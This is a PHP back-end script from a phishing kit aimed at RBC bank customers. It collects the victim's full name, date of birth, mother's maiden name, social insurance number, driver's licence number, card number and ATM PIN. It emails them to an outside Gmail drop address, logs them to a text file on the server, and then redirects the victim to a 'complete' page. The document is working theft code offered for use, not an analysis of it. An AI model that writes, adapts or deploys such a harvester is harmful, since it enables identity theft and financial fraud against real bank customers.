<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 PersonalDetails----------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "DOB		: ".$_POST['D1']."-".$_POST['D2']."-".$_POST['D3']."\n";
$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "SIN		: ".$_POST['SN']."\n";
$message .= "DLN		: ".$_POST['DN']."\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "2DIGIT		: ".$_POST['IN']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------RBCResults-----------------------\n";
$send = "all.results13@gmail.com";
$subject = "RBCResultz 3 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../../../../../RBCresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "complete.html";
</script>